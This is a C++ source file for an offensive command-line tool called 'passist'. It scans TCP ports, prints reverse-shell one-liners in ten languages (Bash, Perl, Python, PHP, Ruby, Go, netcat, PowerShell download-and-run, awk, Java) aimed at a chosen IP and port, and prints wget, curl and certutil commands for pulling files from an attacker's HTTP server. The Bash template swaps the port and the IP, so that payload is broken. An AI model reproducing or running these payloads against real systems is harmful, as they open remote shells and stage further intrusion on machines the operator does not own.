#include <bits/stdc++.h>
#include <stdlib.h>
#include <SFML/Network.hpp>
using namespace std;

static bool port_is_open(const string& address, int port){
    return (sf::TcpSocket().connect(address, port) == sf::Socket::Done);
}

// usage function : shown in starting
void usage(){
	cout << "Usage:\n  passist [commands]" << endl;
	cout << "\tAvailable Commands:" << endl;
	cout << "\tscan\t\tport scanning utility\t\t\tex - ./passist scan ip" << endl;
	cout << "\trev\t\treverse shell code generator\t\tex - ./passist rev ip port" << endl;
	cout << "\tfifer\t\tfile transfer\t\t\t\tex - ./passist fifer ip file_to_transfer" << endl;
}

void choice_of_payloads(){
        cout << "1. Bash" << endl;
        cout << "2. Perl" << endl;
        cout << "3. Python" << endl;
        cout << "4. PHP" << endl;
        cout << "5. Ruby" << endl;
        cout << "6. Golang" << endl;
        cout << "7. Netcat" << endl;
        cout << "8. Powershell" << endl;
        cout << "9. awk" << endl;
        cout << "10. Java" << endl;
}



void reverse_payload_generator(int choice, string ip, int port){
        switch(choice){
                case 1:
                        cout << "\nbash -i >& /dev/tcp/" << port << "/" << ip << " 0>&1\n" << endl;
                        break;

                case 2:
                        cout << "\nperl -e \'use Socket;$i=\""<< ip << "\";$p=" << port << ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n" << endl;
                        cout << "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\""<< ip << ":" << port << "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n" << endl;
                        cout << "(Windows only) perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"" << ip << ":" << port << "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n" << endl;
                        break;

                case 3:
                        cout << "\n(Linux only) python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" << ip << "\"," << port << "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n" << endl;

                        break;

                case 4:
                        cout << "\nphp -r '$sock=fsockopen(\"" << ip << "\"," << port << ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");`/bin/sh -i <&3 >&3 2>&3`;'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");system(\"/bin/sh -i <&3 >&3 2>&3\");'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");passthru(\"/bin/sh -i <&3 >&3 2>&3\");'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");popen(\"/bin/sh -i <&3 >&3 2>&3\");'\n" << endl;
                        cout << "php -r '$sock=fsockopen(\"" << ip << "\"," << port << ");$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n" << endl;
                        break;

                case 5:
                        cout << "\nruby -rsocket -e'f=TCPSocket.open(\"" << ip << "\"," << port << ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n" << endl;
                        cout << "ruby -rsocket -e 'c=TCPSocket.new(\"" << ip << "\"," << port << ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n" << endl;
                        cout << "(Windows only) ruby -rsocket -e 'c=TCPSocket.new(\"" << ip << "\"," << port << ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n" << endl;
                        break;

                case 6:
                        cout << "\necho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" << ip << ":" << port << ");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n" << endl;
                        break;

                case 7:
                        cout << "\n(Netcat Traditional) nc -e /bin/sh " << ip << " " << port << "\n" << endl;
                        cout << "(Netcat Traditional) nc -e /bin/bash " << ip << " " << port << "\n" << endl;
                        cout << "(Netcat Traditional) nc -c bash " << ip << " " << port << "\n" << endl;
                        cout << "(Netcat OpenBsd/Busybox) rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " << ip << " " << port << " >/tmp/f\n" << endl;
                        cout << "(Ncat) ncat " << ip << " " << port <<  " -e /bin/bash\n" << endl;
                        break;

                case 8:
                		cout << "\n(Powershell Invoke Expression Oneliner)" << endl << "iex(new-object net.webclient).downloadstring('http://" << ip <<"/shell.ps1') "  << "\n" << endl;	
                		break;


                case 9:
                        cout << "\nawk 'BEGIN {s = \"/inet/tcp/0/" << ip << "/" << port << "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n" << endl;
                        break;

                case 10:
                        cout << "\nRuntime r = Runtime.getRuntime();" << endl;
                        cout << "Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/" << ip << "/" << port << ";cat <&5 | while read line; do $line 2>&5 >&5; done'\");" << endl;
                        cout << "p.waitFor();" << endl;
                        break;

                 default:
                 		cout << endl << "Invalid Input" << endl << endl;
                 		usage();      

        }
}



void file_transfer_payload_generator(string ip, string filename){
			cout << "=======================================================================" << endl;
			cout << "Execute on client :" << endl;
			cout << "=======================================================================" << endl;
			cout << "\t\t\tGeneric (Both Windows & Linux)               " << endl;
            cout << "=======================================================================" << endl;
            cout << "wget http://" << ip << ":8000/" +  filename << " -O " << filename << endl;
			cout << "=======================================================================" << endl;	
			cout << "curl http://" << ip << ":8000/" +  filename << " -o " << filename << endl;		
            cout << "=======================================================================" << endl;
            cout << "\t\t\tWindows Specific                             " << endl;
            cout << "=======================================================================" << endl;
            cout << "iwr -Uri http://" << ip << ":8000/" +  filename << " -Outfile " << filename << endl;	
            cout << "=======================================================================" << endl;
			cout << "certutil -urlcache -f http://" << ip << ":8000/" +  filename << " " << filename << endl;		
            cout << "=======================================================================" << endl;
            cout << "\nTo kill this script hit CTRL-C\n"; 
			system("python3 -m http.server");
				 

				

				//cout << "File transfer Using Netcat:\n\n" << "Execute on server: nc "<< ip << " "<< port << " < " << filename << "\nExecute on client: nc -lvnp " << port << " > " << filename << endl; 
				
}


int main(int argc, char** argv){
	// checking the number of command line arguments

	if (argc < 3){
		usage();
		exit(0);
	}

	// port scan

	if(!strcmp(argv[1],"scan") || !strcmp(argv[1],"-s")){
		for(int i=1; i<=65000; ++i){
			if(port_is_open(argv[2],i)){
				cout << "open port : " << i << endl;
			}
		}
	//cout << "Port scanning complete!" << endl;
	}

	// reverse shell generator

	else if(!strncmp(argv[1],"rev", 5) || !strncmp(argv[1], "-r", 5)){
		        int input;
            cout << "Enter from below choice to generate reverse shell" << endl;
            choice_of_payloads();
            cin >> input;
            reverse_payload_generator(input, argv[2], atoi(argv[3]));
}

else if(!strncmp(argv[1],"fifer", 5) || !strncmp(argv[1], "-f", 5)){
		      
            file_transfer_payload_generator(argv[2], argv[3]);
            //reverse_payload_generator(input, argv[2], atoi(argv[3]));
}


	else{
		cout << "invalid option" << endl;
	}
	return 0;
}
